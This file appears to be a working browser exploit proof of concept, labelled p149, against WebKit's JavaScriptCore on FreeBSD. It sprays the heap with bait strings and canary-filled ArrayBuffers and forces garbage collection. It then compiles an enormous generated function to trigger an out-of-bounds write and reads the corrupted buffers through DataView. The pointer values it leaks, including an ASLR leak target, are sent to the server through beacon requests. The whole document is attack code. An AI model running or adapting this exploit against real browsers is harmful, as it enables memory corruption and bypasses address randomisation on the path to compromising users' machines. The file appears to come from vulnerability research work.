// p149 — ArrayBuffer backing store leak via marge corruption
//
// SOURCE-VERIFIED FINDINGS (WebKit-1200):
//   JSString::length() at JSString.h:740-746:
//     - Resolved string: follows m_fiber pointer → reads StringImpl::m_length
//     - Rope (m_fiber & 1): reads CompactFibers::m_length at JSString offset 16
//   StringImpl layout (StringImpl.h:161-171):
//     offset 0: m_refCount (4B), offset 4: m_length (4B),
//     offset 8: m_data8 ptr (8B), offset 16: m_hashAndFlags (4B), offset 20+: inline data
//   Gigacage: DISABLED on FreeBSD (Gigacage.h:43-47, requires Darwin||Linux)
//   FastMallocAlignedMemoryAllocator: MarkedSpace blocks via tryFastAlignedMalloc (line 49)
//     → same bmalloc marge heap as StringImpl AND MetadataTable
//   ArrayBuffer backing stores: FastMalloc when Gigacage disabled → marge for >=4KB
//
// DIAGNOSIS: p146-p148 saw .length=81400 because:
//   1. Sweep hits MarkedSpace blocks (in marge, above metadata buffer)
//   2. Corrupts JSString::m_fiber → bit 0 set → rope path → reads offset 16 = 0x13E08
//   3. StringImpl bodies are at LOWER marge addresses → NOT in forward sweep path
//   4. charCodeAt reads through view → view's StringImpl intact → 'A'
//
// FIX: FinalizationRegistry confirms bait GC → freed marge slots at LOW addresses
//      → metadata buffer fills low slot → sweep goes FORWARD into targets
//      ArrayBuffer backing stores in marge (Gigacage disabled) → DataView reads raw bytes
//
// Beacon prefix: V149M-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V149M-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var STR_LEN = 100000;
  var AB_SIZE  = 102400;
  var CANARY_AB = 0xCC;
  var CANARY_STR = 0x41;

  // FinalizationRegistry: detect actual bait GC collection
  var baitCollected = 0;
  var finResolve = null;
  var registry = new FinalizationRegistry(function(id) {
    baitCollected++;
    if (baitCollected <= 5 || baitCollected % 5 === 0) {
      B('FIN-' + id + '-n=' + baitCollected);
    }
    if (finResolve && baitCollected >= 5) {
      var r = finResolve;
      finResolve = null;
      r();
    }
  });

  // ============ PHASE 1: BAIT STRINGS ============
  var N_BAIT = 20;
  B('P1-BAIT');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    registry.register(bait, i);
    baits.push(bait);
  }
  B('P1-DONE-' + N_BAIT);

  // ============ PHASE 2: TARGET ArrayBuffers ============
  var N_AB = 20;
  var abTargets = [];
  var abViews = [];
  B('P2-AB');
  for (var i = 0; i < N_AB; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var fill = new Uint8Array(ab);
    for (var j = 0; j < fill.length; j++) fill[j] = CANARY_AB;
    abTargets.push(ab);
    abViews.push(new DataView(ab));
  }
  B('P2-AB-DONE-' + N_AB);

  // ============ PHASE 2b: TARGET STRINGS (.length harvest) ============
  var N_STR = 50;
  var strTargets = [];
  B('P2B-STR');
  for (var i = 0; i < N_STR; i++) {
    var s = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
    }
    s = s.substring(0, STR_LEN);
    s.charCodeAt(0);
    strTargets.push(s);
  }
  B('P2B-DONE-' + N_STR);

  // ============ PHASE 3: FREE BAITS + AGGRESSIVE GC ============
  B('P3-FREE');
  for (var i = 0; i < N_BAIT; i++) baits[i] = null;
  baits = null;

  var gcPhase = 0;
  var oldGen = [];

  function gcStep() {
    gcPhase++;

    if (gcPhase <= 20) {
      // Phase A: Promote objects to old-gen by holding through Eden GC cycles
      for (var j = 0; j < 40; j++) {
        oldGen.push(new ArrayBuffer(65536));
      }
      // Ephemeral allocations trigger Eden GC
      for (var j = 0; j < 500; j++) new ArrayBuffer(16384);
      if (gcPhase % 10 === 0) B('GCA-' + gcPhase);
      setTimeout(gcStep, 40);

    } else if (gcPhase === 21) {
      // Phase B: Drop old-gen → massive garbage in old generation
      var held = oldGen.length;
      oldGen = null;
      B('GCB-DROP-' + held);
      // Heavy allocation to trigger Full GC of old-gen + baits
      for (var j = 0; j < 2000; j++) new ArrayBuffer(32768);
      setTimeout(gcStep, 150);

    } else if (gcPhase <= 50) {
      // Phase C: Sustained pressure — keep triggering Full GC cycles
      for (var j = 0; j < 800; j++) new ArrayBuffer(16384);
      for (var j = 0; j < 200; j++) {
        var a = new Array(500);
        for (var k = 0; k < 500; k++) a[k] = gcPhase;
      }
      if (gcPhase % 10 === 0) B('GCC-' + gcPhase + '-fin=' + baitCollected);
      setTimeout(gcStep, 30);

    } else {
      // GC pressure done
      B('P3-DONE-fin=' + baitCollected);
      checkFinAndProceed();
    }
  }

  function checkFinAndProceed() {
    if (baitCollected >= 5) {
      B('FIN-OK-' + baitCollected);
      phaseBuild();
    } else {
      B('FIN-WAIT-' + baitCollected);
      finResolve = function() {
        B('FIN-LATE-' + baitCollected);
        phaseBuild();
      };
      // Extra GC rounds while waiting
      var extraRound = 0;
      var extraTimer = setInterval(function() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(32768);
        extraRound++;
        if (extraRound % 5 === 0) B('EXTRA-' + extraRound + '-fin=' + baitCollected);
        if (baitCollected >= 5 || extraRound >= 30) {
          clearInterval(extraTimer);
          if (finResolve) {
            finResolve = null;
            B('FIN-FINAL-' + baitCollected);
            phaseBuild();
          }
        }
      }, 100);
    }
  }

  gcStep();

  // ============ PHASE 4: BUILD + COMPILE OVERFLOW ============
  function phaseBuild() {
    B('P4-BUILD-fin=' + baitCollected);
    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v149fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v149ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v149ok ? 'OK' : 'FAIL'));
      if (!window.__v149fn) { B('NO-FN'); return; }
      phaseRead();
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ============ PHASE 5: READ CORRUPTION ============
  function phaseRead() {
    var abLeaked = 0;
    var strCorrupt = 0;

    // 5A: ArrayBuffer targets — DataView reads raw bytes
    B('P5A-AB');
    for (var i = 0; i < abTargets.length; i++) {
      try {
        var dv = abViews[i];
        var bl = abTargets[i].byteLength;
        if (bl !== AB_SIZE) {
          B('AB-BL-' + i + '-' + bl);
        }

        // Check first 16 bytes for canary corruption
        var corrupted = false;
        for (var c = 0; c < 16; c++) {
          if (dv.getUint8(c) !== CANARY_AB) { corrupted = true; break; }
        }

        if (corrupted) {
          abLeaked++;
          B('AB-HIT-' + i);

          // Dump first 112 bytes (one full entry) in hex
          var hex = '';
          for (var j = 0; j < 112 && j < bl; j++) hex += hexByte(dv.getUint8(j));
          B('AE0-' + i + '-' + hex.substring(0, 120));
          if (hex.length > 120) B('AE1-' + i + '-' + hex.substring(120));

          // Extract pointer fields from BaselineCallLinkInfo:
          // m_doneLocation: entry offset 16-23 (LLInt code location)
          var p1 = '';
          for (var j = 16; j < 24 && j < bl; j++) p1 += hexByte(dv.getUint8(j));
          B('DONE-' + i + '-' + p1);

          // m_slowPathCallDestination: entry offset 24-31 (ASLR leak target)
          var p2 = '';
          for (var j = 24; j < 32 && j < bl; j++) p2 += hexByte(dv.getUint8(j));
          B('SLOW-' + i + '-' + p2);

          // m_calleeOrCodeBlock: entry offset 48-55
          var p3 = '';
          for (var j = 48; j < 56 && j < bl; j++) p3 += hexByte(dv.getUint8(j));
          B('CBLK-' + i + '-' + p3);

          // m_bytecodeIndex: entry offset 68-71
          var p4 = '';
          for (var j = 68; j < 72 && j < bl; j++) p4 += hexByte(dv.getUint8(j));
          B('BIDX-' + i + '-' + p4);

          // Also check at entry-stride offsets (112, 224, 336)
          // to sample multiple entries for the same target
          for (var eIdx = 1; eIdx <= 3; eIdx++) {
            var base = eIdx * 112;
            if (base + 32 <= bl) {
              var sp = '';
              for (var j = base + 24; j < base + 32; j++) sp += hexByte(dv.getUint8(j));
              B('SE' + eIdx + '-' + i + '-' + sp);
            }
          }

          if (abLeaked >= 5) break;
        }
      } catch(e) {
        B('AB-ERR-' + i + '-' + (e.message || '').substring(0, 30));
      }
    }
    B('AB-TOTAL-' + abLeaked);

    // 5B: Also scan WITHIN each ArrayBuffer for corruption pockets
    // (entry alignment may not start at offset 0 of the backing store)
    if (abLeaked === 0) {
      B('P5A-DEEP');
      for (var i = 0; i < abTargets.length && abLeaked === 0; i++) {
        try {
          var dv = abViews[i];
          var bl = abTargets[i].byteLength;
          // Sample every 4096 bytes (marge chunk boundary)
          for (var off = 0; off < bl && abLeaked === 0; off += 4096) {
            if (dv.getUint8(off) !== CANARY_AB) {
              B('AB-DEEP-' + i + '-off=' + off);
              var hex = '';
              for (var j = off; j < off + 112 && j < bl; j++) hex += hexByte(dv.getUint8(j));
              B('AD0-' + i + '-' + hex.substring(0, 120));
              if (hex.length > 120) B('AD1-' + i + '-' + hex.substring(120));
              abLeaked++;
            }
          }
        } catch(e) {
          B('ABD-ERR-' + i);
        }
      }
      B('AB-DEEP-TOTAL-' + abLeaked);
    }

    // 5C: String .length harvest (different cell alignments for 4-byte windows)
    B('P5C-STR');
    var lengthMap = {};
    for (var i = 0; i < strTargets.length; i++) {
      try {
        var len = strTargets[i].length;
        if (len !== STR_LEN) {
          strCorrupt++;
          var hx = len.toString(16);
          if (!lengthMap[hx]) lengthMap[hx] = [];
          lengthMap[hx].push(i);
          if (strCorrupt <= 15) B('SL-' + i + '-0x' + hx + '=' + len);
        }
      } catch(e) {
        B('SL-ERR-' + i);
        strCorrupt++;
      }
    }
    var uniq = Object.keys(lengthMap);
    B('STR-' + strCorrupt + '-UNIQ-' + uniq.length);
    for (var k = 0; k < uniq.length && k < 10; k++) {
      B('SLV-0x' + uniq[k] + '-x' + lengthMap[uniq[k]].length);
    }

    B('PRE-AB=' + abLeaked + '-STR=' + strCorrupt + '-FIN=' + baitCollected);

    // Now CALL the function — this triggers the actual 4.29GB OOB write
    // (corruption may happen during compilation OR execution; cover both)
    setTimeout(function() {
      B('CALLING');
      try { window.__v149fn(function(){}); }
      catch(ex) { B('CATCH-' + (ex.message || '').substring(0, 30)); }
      B('SURVIVED');

      // POST-CALL read: the 4.29GB sweep is now definitely done
      setTimeout(function() { phasePostCallRead(); }, 200);
    }, 100);
  }

  // ============ PHASE 6: POST-CALL READ ============
  function phasePostCallRead() {
    B('P6-POST');
    var postAB = 0;
    var postSTR = 0;

    // Re-scan ArrayBuffer targets after the sweep
    for (var i = 0; i < abTargets.length; i++) {
      try {
        var dv = abViews[i];
        var corrupted = false;
        for (var c = 0; c < 16; c++) {
          if (dv.getUint8(c) !== CANARY_AB) { corrupted = true; break; }
        }
        if (corrupted) {
          postAB++;
          B('PAB-' + i);
          var hex = '';
          for (var j = 0; j < 112 && j < abTargets[i].byteLength; j++) hex += hexByte(dv.getUint8(j));
          B('PE0-' + i + '-' + hex.substring(0, 120));
          if (hex.length > 120) B('PE1-' + i + '-' + hex.substring(120));

          // Key pointers
          var p2 = '';
          for (var j = 24; j < 32 && j < abTargets[i].byteLength; j++) p2 += hexByte(dv.getUint8(j));
          B('PSLOW-' + i + '-' + p2);

          if (postAB >= 3) break;
        }
      } catch(e) {
        B('PAB-ERR-' + i + '-' + (e.message || '').substring(0, 20));
      }
    }

    // Re-scan string .length values
    for (var i = 0; i < strTargets.length; i++) {
      try {
        var len = strTargets[i].length;
        if (len !== STR_LEN) {
          postSTR++;
          if (postSTR <= 10) B('PSL-' + i + '-0x' + len.toString(16));
        }
      } catch(e) { postSTR++; }
    }

    B('POST-AB=' + postAB + '-STR=' + postSTR);
    B('DONE');
  }
})();
